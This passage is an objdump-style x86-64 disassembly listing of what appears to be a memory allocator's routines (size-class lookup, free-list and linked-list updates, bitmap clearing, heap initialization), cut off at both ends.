    6d8c22e1:	48 85 f6             	test   %rsi,%rsi
    6d8c22e4:	74 1d                	je     0x6d8c2303
    6d8c22e6:	49 89 c1             	mov    %rax,%r9
    6d8c22e9:	48 89 f2             	mov    %rsi,%rdx
    6d8c22ec:	48 89 d9             	mov    %rbx,%rcx
    6d8c22ef:	e8 b4 fe ff ff       	call   0x6d8c21a8
    6d8c22f4:	48 8d 87 ff 0f 00 00 	lea    0xfff(%rdi),%rax
    6d8c22fb:	48 3b 46 08          	cmp    0x8(%rsi),%rax
    6d8c22ff:	7d 3f                	jge    0x6d8c2340
    6d8c2301:	eb 2f                	jmp    0x6d8c2332
    6d8c2303:	49 81 fa ff ff 07 00 	cmp    $0x7ffff,%r10
    6d8c230a:	7e 16                	jle    0x6d8c2322
    6d8c230c:	48 89 fa             	mov    %rdi,%rdx
    6d8c230f:	48 89 d9             	mov    %rbx,%rcx
    6d8c2312:	e8 8e fb ff ff       	call   0x6d8c1ea5
    6d8c2317:	48 39 78 08          	cmp    %rdi,0x8(%rax)
    6d8c231b:	48 89 c6             	mov    %rax,%rsi
    6d8c231e:	7e 20                	jle    0x6d8c2340
    6d8c2320:	eb 10                	jmp    0x6d8c2332
    6d8c2322:	ba 00 00 08 00       	mov    $0x80000,%edx
    6d8c2327:	48 89 d9             	mov    %rbx,%rcx
    6d8c232a:	e8 76 fb ff ff       	call   0x6d8c1ea5
    6d8c232f:	48 89 c6             	mov    %rax,%rsi
    6d8c2332:	49 89 f8             	mov    %rdi,%r8
    6d8c2335:	48 89 f2             	mov    %rsi,%rdx
    6d8c2338:	48 89 d9             	mov    %rbx,%rcx
    6d8c233b:	e8 4b fe ff ff       	call   0x6d8c218b
    6d8c2340:	49 89 f0             	mov    %rsi,%r8
    6d8c2343:	48 c7 06 01 00 00 00 	movq   $0x1,(%rsi)
    6d8c234a:	48 89 d9             	mov    %rbx,%rcx
    6d8c234d:	48 8d 93 a8 20 00 00 	lea    0x20a8(%rbx),%rdx
    6d8c2354:	49 c1 f8 0c          	sar    $0xc,%r8
    6d8c2358:	e8 f4 fc ff ff       	call   0x6d8c2051
    6d8c235d:	48 89 f0             	mov    %rsi,%rax
    6d8c2360:	48 29 bb 90 20 00 00 	sub    %rdi,0x2090(%rbx)
    6d8c2367:	48 83 c4 20          	add    $0x20,%rsp
    6d8c236b:	5b                   	pop    %rbx
    6d8c236c:	5e                   	pop    %rsi
    6d8c236d:	5f                   	pop    %rdi
    6d8c236e:	c3                   	ret
    6d8c236f:	ba 00 10 00 00       	mov    $0x1000,%edx
    6d8c2374:	e9 a4 fe ff ff       	jmp    0x6d8c221d
    6d8c2379:	56                   	push   %rsi
    6d8c237a:	53                   	push   %rbx
    6d8c237b:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c237f:	48 89 cb             	mov    %rcx,%rbx
    6d8c2382:	48 89 d1             	mov    %rdx,%rcx
    6d8c2385:	48 89 d6             	mov    %rdx,%rsi
    6d8c2388:	e8 99 f9 ff ff       	call   0x6d8c1d26
    6d8c238d:	48 8d 93 a8 20 00 00 	lea    0x20a8(%rbx),%rdx
    6d8c2394:	48 89 d9             	mov    %rbx,%rcx
    6d8c2397:	48 01 b3 80 20 00 00 	add    %rsi,0x2080(%rbx)
    6d8c239e:	49 89 c0             	mov    %rax,%r8
    6d8c23a1:	48 89 70 08          	mov    %rsi,0x8(%rax)
    6d8c23a5:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    6d8c23ac:	00 
    6d8c23ad:	49 c1 f8 0c          	sar    $0xc,%r8
    6d8c23b1:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
    6d8c23b8:	00 
    6d8c23b9:	48 c7 00 01 00 00 00 	movq   $0x1,(%rax)
    6d8c23c0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c23c5:	e8 87 fc ff ff       	call   0x6d8c2051
    6d8c23ca:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    6d8c23cf:	48 83 c4 38          	add    $0x38,%rsp
    6d8c23d3:	5b                   	pop    %rbx
    6d8c23d4:	5e                   	pop    %rsi
    6d8c23d5:	c3                   	ret
    6d8c23d6:	48 83 b9 d8 28 00 00 	cmpq   $0x0,0x28d8(%rcx)
    6d8c23dd:	00 
    6d8c23de:	48 8d 81 d8 28 00 00 	lea    0x28d8(%rcx),%rax
    6d8c23e5:	75 0e                	jne    0x6d8c23f5
    6d8c23e7:	48 89 81 d8 28 00 00 	mov    %rax,0x28d8(%rcx)
    6d8c23ee:	48 89 81 e0 28 00 00 	mov    %rax,0x28e0(%rcx)
    6d8c23f5:	c3                   	ret
    6d8c23f6:	56                   	push   %rsi
    6d8c23f7:	53                   	push   %rbx
    6d8c23f8:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c23fc:	48 89 d6             	mov    %rdx,%rsi
    6d8c23ff:	48 8b 91 c0 28 00 00 	mov    0x28c0(%rcx),%rdx
    6d8c2406:	48 89 cb             	mov    %rcx,%rbx
    6d8c2409:	48 85 d2             	test   %rdx,%rdx
    6d8c240c:	75 19                	jne    0x6d8c2427
    6d8c240e:	ba 28 00 00 00       	mov    $0x28,%edx
    6d8c2413:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
    6d8c2418:	e8 33 f9 ff ff       	call   0x6d8c1d50
    6d8c241d:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
    6d8c2422:	48 89 c2             	mov    %rax,%rdx
    6d8c2425:	eb 0a                	jmp    0x6d8c2431
    6d8c2427:	48 8b 02             	mov    (%rdx),%rax
    6d8c242a:	48 89 81 c0 28 00 00 	mov    %rax,0x28c0(%rcx)
    6d8c2431:	48 89 72 10          	mov    %rsi,0x10(%rdx)
    6d8c2435:	48 89 d9             	mov    %rbx,%rcx
    6d8c2438:	4c 89 42 18          	mov    %r8,0x18(%rdx)
    6d8c243c:	e8 95 ff ff ff       	call   0x6d8c23d6
    6d8c2441:	48 89 02             	mov    %rax,(%rdx)
    6d8c2444:	48 89 42 08          	mov    %rax,0x8(%rdx)
    6d8c2448:	48 89 d0             	mov    %rdx,%rax
    6d8c244b:	48 c7 42 20 01 00 00 	movq   $0x1,0x20(%rdx)
    6d8c2452:	00 
    6d8c2453:	48 83 c4 28          	add    $0x28,%rsp
    6d8c2457:	5b                   	pop    %rbx
    6d8c2458:	5e                   	pop    %rsi
    6d8c2459:	c3                   	ret
    6d8c245a:	48 8b 01             	mov    (%rcx),%rax
    6d8c245d:	48 8b 10             	mov    (%rax),%rdx
    6d8c2460:	4c 8b 40 20          	mov    0x20(%rax),%r8
    6d8c2464:	4c 39 42 20          	cmp    %r8,0x20(%rdx)
    6d8c2468:	75 11                	jne    0x6d8c247b
    6d8c246a:	48 89 11             	mov    %rdx,(%rcx)
    6d8c246d:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    6d8c2471:	48 89 10             	mov    %rdx,(%rax)
    6d8c2474:	48 8b 11             	mov    (%rcx),%rdx
    6d8c2477:	48 89 42 08          	mov    %rax,0x8(%rdx)
    6d8c247b:	c3                   	ret
    6d8c247c:	48 8b 01             	mov    (%rcx),%rax
    6d8c247f:	48 8b 50 08          	mov    0x8(%rax),%rdx
    6d8c2483:	4c 8b 48 20          	mov    0x20(%rax),%r9
    6d8c2487:	4c 8b 42 08          	mov    0x8(%rdx),%r8
    6d8c248b:	4d 39 48 20          	cmp    %r9,0x20(%r8)
    6d8c248f:	75 17                	jne    0x6d8c24a8
    6d8c2491:	48 89 11             	mov    %rdx,(%rcx)
    6d8c2494:	48 8b 12             	mov    (%rdx),%rdx
    6d8c2497:	48 89 50 08          	mov    %rdx,0x8(%rax)
    6d8c249b:	48 8b 11             	mov    (%rcx),%rdx
    6d8c249e:	48 89 02             	mov    %rax,(%rdx)
    6d8c24a1:	48 8b 01             	mov    (%rcx),%rax
    6d8c24a4:	48 ff 40 20          	incq   0x20(%rax)
    6d8c24a8:	c3                   	ret
    6d8c24a9:	53                   	push   %rbx
    6d8c24aa:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c24ae:	48 89 d3             	mov    %rdx,%rbx
    6d8c24b1:	4c 89 c2             	mov    %r8,%rdx
    6d8c24b4:	48 8b 03             	mov    (%rbx),%rax
    6d8c24b7:	48 3b 00             	cmp    (%rax),%rax
    6d8c24ba:	74 08                	je     0x6d8c24c4
    6d8c24bc:	4c 39 40 10          	cmp    %r8,0x10(%rax)
    6d8c24c0:	76 13                	jbe    0x6d8c24d5
    6d8c24c2:	eb 17                	jmp    0x6d8c24db
    6d8c24c4:	4d 89 c8             	mov    %r9,%r8
    6d8c24c7:	e8 2a ff ff ff       	call   0x6d8c23f6
    6d8c24cc:	48 89 03             	mov    %rax,(%rbx)
    6d8c24cf:	48 83 c4 20          	add    $0x20,%rsp
    6d8c24d3:	5b                   	pop    %rbx
    6d8c24d4:	c3                   	ret
    6d8c24d5:	74 0f                	je     0x6d8c24e6
    6d8c24d7:	48 83 c0 08          	add    $0x8,%rax
    6d8c24db:	49 89 d0             	mov    %rdx,%r8
    6d8c24de:	48 89 c2             	mov    %rax,%rdx
    6d8c24e1:	e8 c3 ff ff ff       	call   0x6d8c24a9
    6d8c24e6:	48 89 d9             	mov    %rbx,%rcx
    6d8c24e9:	e8 6c ff ff ff       	call   0x6d8c245a
    6d8c24ee:	90                   	nop
    6d8c24ef:	48 83 c4 20          	add    $0x20,%rsp
    6d8c24f3:	5b                   	pop    %rbx
    6d8c24f4:	eb 86                	jmp    0x6d8c247c
    6d8c24f6:	55                   	push   %rbp
    6d8c24f7:	57                   	push   %rdi
    6d8c24f8:	56                   	push   %rsi
    6d8c24f9:	53                   	push   %rbx
    6d8c24fa:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c24fe:	48 8d 42 0f          	lea    0xf(%rdx),%rax
    6d8c2502:	48 89 cb             	mov    %rcx,%rbx
    6d8c2505:	48 89 c7             	mov    %rax,%rdi
    6d8c2508:	48 83 e7 f0          	and    $0xfffffffffffffff0,%rdi
    6d8c250c:	48 81 ff c0 0f 00 00 	cmp    $0xfc0,%rdi
    6d8c2513:	7e 1e                	jle    0x6d8c2533
    6d8c2515:	48 8d 7a 20          	lea    0x20(%rdx),%rdi
    6d8c2519:	48 81 ff 00 00 00 3f 	cmp    $0x3f000000,%rdi
    6d8c2520:	0f 8f e1 00 00 00    	jg     0x6d8c2607
    6d8c2526:	48 89 fa             	mov    %rdi,%rdx
    6d8c2529:	e8 ef fc ff ff       	call   0x6d8c221d
    6d8c252e:	e9 dc 00 00 00       	jmp    0x6d8c260f
    6d8c2533:	48 c1 f8 04          	sar    $0x4,%rax
    6d8c2537:	48 8d 2c c1          	lea    (%rcx,%rax,8),%rbp
    6d8c253b:	48 8b 45 10          	mov    0x10(%rbp),%rax
    6d8c253f:	48 85 c0             	test   %rax,%rax
    6d8c2542:	74 12                	je     0x6d8c2556
    6d8c2544:	48 8b 70 20          	mov    0x20(%rax),%rsi
    6d8c2548:	48 85 f6             	test   %rsi,%rsi
    6d8c254b:	74 55                	je     0x6d8c25a2
    6d8c254d:	48 8b 16             	mov    (%rsi),%rdx
    6d8c2550:	48 89 50 20          	mov    %rdx,0x20(%rax)
    6d8c2554:	eb 5c                	jmp    0x6d8c25b2
    6d8c2556:	e8 14 fe ff ff       	call   0x6d8c236f
    6d8c255b:	ba c0 0f 00 00       	mov    $0xfc0,%edx
    6d8c2560:	48 29 fa             	sub    %rdi,%rdx
    6d8c2563:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    6d8c256a:	00 
    6d8c256b:	48 89 50 28          	mov    %rdx,0x28(%rax)
    6d8c256f:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
    6d8c2576:	00 
    6d8c2577:	48 8b 55 10          	mov    0x10(%rbp),%rdx
    6d8c257b:	48 c7 40 20 00 00 00 	movq   $0x0,0x20(%rax)
    6d8c2582:	00 
    6d8c2583:	48 89 78 08          	mov    %rdi,0x8(%rax)
    6d8c2587:	48 89 78 30          	mov    %rdi,0x30(%rax)
    6d8c258b:	48 85 d2             	test   %rdx,%rdx
    6d8c258e:	48 89 50 10          	mov    %rdx,0x10(%rax)
    6d8c2592:	74 04                	je     0x6d8c2598
    6d8c2594:	48 89 42 18          	mov    %rax,0x18(%rdx)
    6d8c2598:	48 89 45 10          	mov    %rax,0x10(%rbp)
    6d8c259c:	48 8d 70 40          	lea    0x40(%rax),%rsi
    6d8c25a0:	eb 14                	jmp    0x6d8c25b6
    6d8c25a2:	48 8b 50 30          	mov    0x30(%rax),%rdx
    6d8c25a6:	48 8d 74 10 40       	lea    0x40(%rax,%rdx,1),%rsi
    6d8c25ab:	48 01 fa             	add    %rdi,%rdx
    6d8c25ae:	48 89 50 30          	mov    %rdx,0x30(%rax)
    6d8c25b2:	48 29 78 28          	sub    %rdi,0x28(%rax)
    6d8c25b6:	48 39 78 28          	cmp    %rdi,0x28(%rax)
    6d8c25ba:	7d 42                	jge    0x6d8c25fe
    6d8c25bc:	48 3b 45 10          	cmp    0x10(%rbp),%rax
    6d8c25c0:	48 8b 50 10          	mov    0x10(%rax),%rdx
    6d8c25c4:	74 17                	je     0x6d8c25dd
    6d8c25c6:	48 8b 48 18          	mov    0x18(%rax),%rcx
    6d8c25ca:	48 89 51 10          	mov    %rdx,0x10(%rcx)
    6d8c25ce:	48 8b 50 10          	mov    0x10(%rax),%rdx
    6d8c25d2:	48 85 d2             	test   %rdx,%rdx
    6d8c25d5:	74 17                	je     0x6d8c25ee
    6d8c25d7:	48 89 4a 18          	mov    %rcx,0x18(%rdx)
    6d8c25db:	eb 11                	jmp    0x6d8c25ee
    6d8c25dd:	48 85 d2             	test   %rdx,%rdx
    6d8c25e0:	48 89 55 10          	mov    %rdx,0x10(%rbp)
    6d8c25e4:	74 08                	je     0x6d8c25ee
    6d8c25e6:	48 c7 42 18 00 00 00 	movq   $0x0,0x18(%rdx)
    6d8c25ed:	00 
    6d8c25ee:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    6d8c25f5:	00 
    6d8c25f6:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
    6d8c25fd:	00 
    6d8c25fe:	48 01 bb 98 20 00 00 	add    %rdi,0x2098(%rbx)
    6d8c2605:	eb 49                	jmp    0x6d8c2650
    6d8c2607:	48 89 fa             	mov    %rdi,%rdx
    6d8c260a:	e8 6a fd ff ff       	call   0x6d8c2379
    6d8c260f:	48 83 bb a8 28 00 00 	cmpq   $0x0,0x28a8(%rbx)
    6d8c2616:	00 
    6d8c2617:	48 8d 70 20          	lea    0x20(%rax),%rsi
    6d8c261b:	48 89 c5             	mov    %rax,%rbp
    6d8c261e:	75 0f                	jne    0x6d8c262f
    6d8c2620:	48 89 d9             	mov    %rbx,%rcx
    6d8c2623:	e8 ae fd ff ff       	call   0x6d8c23d6
    6d8c2628:	48 89 83 a8 28 00 00 	mov    %rax,0x28a8(%rbx)
    6d8c262f:	48 8d 93 a8 28 00 00 	lea    0x28a8(%rbx),%rdx
    6d8c2636:	49 89 f0             	mov    %rsi,%r8
    6d8c2639:	48 89 d9             	mov    %rbx,%rcx
    6d8c263c:	4c 8d 0c 3e          	lea    (%rsi,%rdi,1),%r9
    6d8c2640:	e8 64 fe ff ff       	call   0x6d8c24a9
    6d8c2645:	48 8b 45 08          	mov    0x8(%rbp),%rax
    6d8c2649:	48 01 83 98 20 00 00 	add    %rax,0x2098(%rbx)
    6d8c2650:	48 89 f0             	mov    %rsi,%rax
    6d8c2653:	48 83 c4 28          	add    $0x28,%rsp
    6d8c2657:	5b                   	pop    %rbx
    6d8c2658:	5e                   	pop    %rsi
    6d8c2659:	5f                   	pop    %rdi
    6d8c265a:	5d                   	pop    %rbp
    6d8c265b:	c3                   	ret
    6d8c265c:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c2660:	48 83 c2 10          	add    $0x10,%rdx
    6d8c2664:	e8 8d fe ff ff       	call   0x6d8c24f6
    6d8c2669:	48 c7 40 08 01 00 00 	movq   $0x1,0x8(%rax)
    6d8c2670:	00 
    6d8c2671:	48 83 c0 10          	add    $0x10,%rax
    6d8c2675:	48 83 c4 28          	add    $0x28,%rsp
    6d8c2679:	c3                   	ret
    6d8c267a:	53                   	push   %rbx
    6d8c267b:	48 83 ec 30          	sub    $0x30,%rsp
    6d8c267f:	48 89 d3             	mov    %rdx,%rbx
    6d8c2682:	e8 d5 ff ff ff       	call   0x6d8c265c
    6d8c2687:	48 89 da             	mov    %rbx,%rdx
    6d8c268a:	48 89 c1             	mov    %rax,%rcx
    6d8c268d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c2692:	e8 b7 f5 ff ff       	call   0x6d8c1c4e
    6d8c2697:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    6d8c269c:	48 83 c4 30          	add    $0x30,%rsp
    6d8c26a0:	5b                   	pop    %rbx
    6d8c26a1:	c3                   	ret
    6d8c26a2:	48 89 ca             	mov    %rcx,%rdx
    6d8c26a5:	48 8d 0d 7c 21 10 00 	lea    0x10217c(%rip),%rcx        # 0x6d9c4828
    6d8c26ac:	eb cc                	jmp    0x6d8c267a
    6d8c26ae:	53                   	push   %rbx
    6d8c26af:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c26b3:	48 89 cb             	mov    %rcx,%rbx
    6d8c26b6:	48 89 51 08          	mov    %rdx,0x8(%rcx)
    6d8c26ba:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
    6d8c26c1:	48 8d 0c d5 00 00 00 	lea    0x0(,%rdx,8),%rcx
    6d8c26c8:	00 
    6d8c26c9:	e8 d4 ff ff ff       	call   0x6d8c26a2
    6d8c26ce:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8c26d2:	48 83 c4 20          	add    $0x20,%rsp
    6d8c26d6:	5b                   	pop    %rbx
    6d8c26d7:	c3                   	ret
    6d8c26d8:	53                   	push   %rbx
    6d8c26d9:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c26dd:	48 89 cb             	mov    %rcx,%rbx
    6d8c26e0:	b9 00 20 00 00       	mov    $0x2000,%ecx
    6d8c26e5:	e8 b8 ff ff ff       	call   0x6d8c26a2
    6d8c26ea:	48 c7 43 08 ff 03 00 	movq   $0x3ff,0x8(%rbx)
    6d8c26f1:	00 
    6d8c26f2:	48 89 43 18          	mov    %rax,0x18(%rbx)
    6d8c26f6:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
    6d8c26fd:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
    6d8c2704:	00 
    6d8c2705:	48 83 c4 20          	add    $0x20,%rsp
    6d8c2709:	5b                   	pop    %rbx
    6d8c270a:	c3                   	ret
    6d8c270b:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c270f:	48 8d 0d c2 20 10 00 	lea    0x1020c2(%rip),%rcx        # 0x6d9c47d8
    6d8c2716:	ba 00 04 00 00       	mov    $0x400,%edx
    6d8c271b:	48 c7 05 a2 20 10 00 	movq   $0x400000,0x1020a2(%rip)        # 0x6d9c47c8
    6d8c2722:	00 00 40 00 
    6d8c2726:	48 c7 05 9f 20 10 00 	movq   $0x1f4,0x10209f(%rip)        # 0x6d9c47d0
    6d8c272d:	f4 01 00 00 
    6d8c2731:	48 c7 05 dc 4b 10 00 	movq   $0x0,0x104bdc(%rip)        # 0x6d9c7318
    6d8c2738:	00 00 00 00 
    6d8c273c:	48 c7 05 d9 4b 10 00 	movq   $0x0,0x104bd9(%rip)        # 0x6d9c7320
    6d8c2743:	00 00 00 00 
    6d8c2747:	48 c7 05 d6 4b 10 00 	movq   $0x0,0x104bd6(%rip)        # 0x6d9c7328
    6d8c274e:	00 00 00 00 
    6d8c2752:	48 c7 05 d3 4b 10 00 	movq   $0x0,0x104bd3(%rip)        # 0x6d9c7330
    6d8c2759:	00 00 00 00 
    6d8c275d:	48 c7 05 d0 4b 10 00 	movq   $0x0,0x104bd0(%rip)        # 0x6d9c7338
    6d8c2764:	00 00 00 00 
    6d8c2768:	48 c7 05 cd 4b 10 00 	movq   $0x0,0x104bcd(%rip)        # 0x6d9c7340
    6d8c276f:	00 00 00 00 
    6d8c2773:	e8 36 ff ff ff       	call   0x6d8c26ae
    6d8c2778:	ba 00 04 00 00       	mov    $0x400,%edx
    6d8c277d:	48 8d 0d 84 20 10 00 	lea    0x102084(%rip),%rcx        # 0x6d9c4808
    6d8c2784:	e8 25 ff ff ff       	call   0x6d8c26ae
    6d8c2789:	ba 00 04 00 00       	mov    $0x400,%edx
    6d8c278e:	48 8d 0d 5b 20 10 00 	lea    0x10205b(%rip),%rcx        # 0x6d9c47f0
    6d8c2795:	e8 14 ff ff ff       	call   0x6d8c26ae
    6d8c279a:	48 8d 0d af 4b 10 00 	lea    0x104baf(%rip),%rcx        # 0x6d9c7350
    6d8c27a1:	e8 32 ff ff ff       	call   0x6d8c26d8
    6d8c27a6:	ba 00 04 00 00       	mov    $0x400,%edx
    6d8c27ab:	48 8d 0d be 4b 10 00 	lea    0x104bbe(%rip),%rcx        # 0x6d9c7370
    6d8c27b2:	e8 f7 fe ff ff       	call   0x6d8c26ae
    6d8c27b7:	48 8b 05 a2 be 10 00 	mov    0x10bea2(%rip),%rax        # 0x6d9ce660
    6d8c27be:	48 8d 50 01          	lea    0x1(%rax),%rdx
    6d8c27c2:	48 89 05 bf 4b 10 00 	mov    %rax,0x104bbf(%rip)        # 0x6d9c7388
    6d8c27c9:	48 89 15 90 be 10 00 	mov    %rdx,0x10be90(%rip)        # 0x6d9ce660
    6d8c27d0:	48 83 c4 28          	add    $0x28,%rsp
    6d8c27d4:	c3                   	ret
    6d8c27d5:	48 89 ca             	mov    %rcx,%rdx
    6d8c27d8:	48 8d 0d 49 20 10 00 	lea    0x102049(%rip),%rcx        # 0x6d9c4828
    6d8c27df:	e9 78 fe ff ff       	jmp    0x6d8c265c
    6d8c27e4:	53                   	push   %rbx
    6d8c27e5:	48 83 ec 30          	sub    $0x30,%rsp
    6d8c27e9:	49 89 d3             	mov    %rdx,%r11
    6d8c27ec:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    6d8c27f0:	48 89 cb             	mov    %rcx,%rbx
    6d8c27f3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    6d8c27f8:	e8 61 f4 ff ff       	call   0x6d8c1c5e
    6d8c27fd:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
    6d8c2802:	49 8b 43 10          	mov    0x10(%r11),%rax
    6d8c2806:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    6d8c280b:	48 85 c0             	test   %rax,%rax
    6d8c280e:	74 08                	je     0x6d8c2818
    6d8c2810:	49 8b 53 18          	mov    0x18(%r11),%rdx
    6d8c2814:	48 89 50 18          	mov    %rdx,0x18(%rax)
    6d8c2818:	49 8b 53 18          	mov    0x18(%r11),%rdx
    6d8c281c:	48 85 d2             	test   %rdx,%rdx
    6d8c281f:	74 04                	je     0x6d8c2825
    6d8c2821:	48 89 42 10          	mov    %rax,0x10(%rdx)
    6d8c2825:	4c 89 c0             	mov    %r8,%rax
    6d8c2828:	48 c1 e0 05          	shl    $0x5,%rax
    6d8c282c:	48 01 c8             	add    %rcx,%rax
    6d8c282f:	48 8d 14 c3          	lea    (%rbx,%rax,8),%rdx
    6d8c2833:	4c 39 9a 78 08 00 00 	cmp    %r11,0x878(%rdx)
    6d8c283a:	75 45                	jne    0x6d8c2881
    6d8c283c:	49 8b 43 10          	mov    0x10(%r11),%rax
    6d8c2840:	48 85 c0             	test   %rax,%rax
    6d8c2843:	48 89 82 78 08 00 00 	mov    %rax,0x878(%rdx)
    6d8c284a:	75 35                	jne    0x6d8c2881
    6d8c284c:	4e 8d 0c 83          	lea    (%rbx,%r8,4),%r9
    6d8c2850:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8c2855:	83 e1 1f             	and    $0x1f,%ecx
    6d8c2858:	48 89 c2             	mov    %rax,%rdx
    6d8c285b:	48 d3 e2             	shl    %cl,%rdx
    6d8c285e:	f7 d2                	not    %edx
    6d8c2860:	41 23 91 14 08 00 00 	and    0x814(%r9),%edx
    6d8c2867:	41 89 91 14 08 00 00 	mov    %edx,0x814(%r9)
    6d8c286e:	75 11                	jne    0x6d8c2881
    6d8c2870:	44 89 c1             	mov    %r8d,%ecx
    6d8c2873:	83 e1 1f             	and    $0x1f,%ecx
    6d8c2876:	48 d3 e0             	shl    %cl,%rax
    6d8c2879:	f7 d0                	not    %eax
    6d8c287b:	21 83 10 08 00 00    	and    %eax,0x810(%rbx)
    6d8c2881:	49 c7 43 18 00 00 00 	movq   $0x0,0x18(%r11)
    6d8c2888:	00 
    6d8c2889:	49 c7 43 10 00 00 00 	movq   $0x0,0x10(%r11)
    6d8c2890:	00 
    6d8c2891:	48 83 c4 30          	add    $0x30,%rsp
    6d8c2895:	5b                   	pop    %rbx
    6d8c2896:	c3                   	ret
    6d8c2897:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c289b:	49 89 d0             	mov    %rdx,%r8
    6d8c289e:	48 c1 fa 09          	sar    $0x9,%rdx
    6d8c28a2:	e8 ad f5 ff ff       	call   0x6d8c1e54
    6d8c28a7:	48 85 c0             	test   %rax,%rax
    6d8c28aa:	74 21                	je     0x6d8c28cd
    6d8c28ac:	4c 89 c1             	mov    %r8,%rcx
    6d8c28af:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    6d8c28b5:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
    6d8c28bb:	48 89 ca             	mov    %rcx,%rdx
    6d8c28be:	49 d3 e0             	shl    %cl,%r8
    6d8c28c1:	48 c1 fa 06          	sar    $0x6,%rdx
    6d8c28c5:	49 f7 d0             	not    %r8
    6d8c28c8:	4c 21 44 d0 10       	and    %r8,0x10(%rax,%rdx,8)
    6d8c28cd:	48 83 c4 28          	add    $0x28,%rsp
    6d8c28d1:	c3                   	ret
    6d8c28d2:	41 54                	push   %r12
    6d8c28d4:	55                   	push   %rbp
    6d8c28d5:	57                   	push   %rdi
    6d8c28d6:	56                   	push   %rsi
    6d8c28d7:	53                   	push   %rbx
    6d8c28d8:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c28dc:	48 8b 42 08          	mov    0x8(%rdx),%rax
    6d8c28e0:	48 01 81 90 20 00 00 	add    %rax,0x2090(%rcx)
    6d8c28e7:	48 8b 02             	mov    (%rdx),%rax
    6d8c28ea:	48 8d a9 a8 20 00 00 	lea    0x20a8(%rcx),%rbp
    6d8c28f1:	48 89 ce             	mov    %rcx,%rsi
    6d8c28f4:	48 89 d3             	mov    %rdx,%rbx
    6d8c28f7:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
    6d8c28fb:	48 89 02             	mov    %rax,(%rdx)
    6d8c28fe:	0f 84 80 00 00 00    	je     0x6d8c2984
    6d8c2904:	48 89 d7             	mov    %rdx,%rdi
    6d8c2907:	48 89 e9             	mov    %rbp,%rcx
    6d8c290a:	48 29 c7             	sub    %rax,%rdi
    6d8c290d:	48 89 fa             	mov    %rdi,%rdx
    6d8c2910:	48 c1 fa 0c          	sar    $0xc,%rdx
    6d8c2914:	e8 53 f5 ff ff       	call   0x6d8c1e6c
    6d8c2919:	84 c0                	test   %al,%al
    6d8c291b:	74 67                	je     0x6d8c2984
    6d8c291d:	f6 07 01             	testb  $0x1,(%rdi)
    6d8c2920:	75 62                	jne    0x6d8c2984
    6d8c2922:	48 8b 47 08          	mov    0x8(%rdi),%rax
    6d8c2926:	48 3d c0 0f 00 00    	cmp    $0xfc0,%rax
    6d8c292c:	7e 56                	jle    0x6d8c2984
    6d8c292e:	48 3d ff ff ff 3e    	cmp    $0x3effffff,%rax
    6d8c2934:	7f 4e                	jg     0x6d8c2984
    6d8c2936:	48 89 fa             	mov    %rdi,%rdx
    6d8c2939:	48 89 f1             	mov    %rsi,%rcx
    6d8c293c:	e8 a3 fe ff ff       	call   0x6d8c27e4
    6d8c2941:	48 8b 43 08          	mov    0x8(%rbx),%rax
    6d8c2945:	48 c1 fb 0c          	sar    $0xc,%rbx
    6d8c2949:	48 89 e9             	mov    %rbp,%rcx
    6d8c294c:	48 01 47 08          	add    %rax,0x8(%rdi)
    6d8c2950:	48 89 da             	mov    %rbx,%rdx
    6d8c2953:	48 89 fb             	mov    %rdi,%rbx
    6d8c2956:	e8 3c ff ff ff       	call   0x6d8c2897
    6d8c295b:	48 81 7f 08 00 00 00 	cmpq   $0x3f000000,0x8(%rdi)
    6d8c2962:	3f 
    6d8c2963:	7e 1f                	jle    0x6d8c2984
    6d8c2965:	48 89 fa             	mov    %rdi,%rdx
    6d8c2968:	48 89 f1             	mov    %rsi,%rcx
    6d8c296b:	41 b8 00 00 00 3f    	mov    $0x3f000000,%r8d
    6d8c2971:	e8 0f f7 ff ff       	call   0x6d8c2085
    6d8c2976:	48 89 fa             	mov    %rdi,%rdx
    6d8c2979:	48 89 f1             	mov    %rsi,%rcx
    6d8c297c:	48 89 c3             	mov    %rax,%rbx
    6d8c297f:	e8 88 f7 ff ff       	call   0x6d8c210c
    6d8c2984:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
    6d8c2988:	48 89 e9             	mov    %rbp,%rcx
    6d8c298b:	4a 8d 3c 0b          	lea    (%rbx,%r9,1),%rdi
    6d8c298f:	49 89 fc             	mov    %rdi,%r12
    6d8c2992:	49 c1 fc 0c          	sar    $0xc,%r12
    6d8c2996:	4c 89 e2             	mov    %r12,%rdx
    6d8c2999:	e8 ce f4 ff ff       	call   0x6d8c1e6c
    6d8c299e:	84 c0                	test   %al,%al
    6d8c29a0:	74 5c                	je     0x6d8c29fe
